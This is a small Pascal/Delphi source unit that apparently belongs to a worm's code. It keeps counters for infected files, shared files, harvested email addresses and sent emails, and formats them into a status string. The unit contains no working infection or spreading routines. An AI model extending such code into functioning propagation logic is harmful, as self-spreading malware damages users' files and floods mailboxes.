   unit untStatus;

   interface

   Var
     SPREAD_FILES_INFECTED :INTEGER = 0;
     SPREAD_FILES_SHARED   :INTEGER = 0;
     SPREAD_EMAIL_FOUND    :INTEGER = 0;
     SPREAD_EMAIL_SENT     :INTEGER = 0;

     Function GetStatus: String;

   implementation

   function InttoStr(const Value: integer): string; var S: string[11];
   begin Str(Value, S); Result := S; end;

   Function FixLen(Text:String; Len: Integer): String;
   Begin
     While Length(Text) < Len Do
       Text := Text + #0160;
     Result := Text;
   End;

   Function GetStatus: String;
   Begin
     Result := '(infected: '+ FixLen(inttostr(SPREAD_FILES_INFECTED),7)+') '+
               '(shared  : '+ FixLen(inttostr(SPREAD_FILES_SHARED  ),7)+') '+
               '(mfound  : '+ FixLen(inttostr(SPREAD_EMAIL_FOUND   ),7)+') '+
               '(mailsent: '+ FixLen(inttostr(SPREAD_EMAIL_SENT    ),7)+')';
   End;

   end.
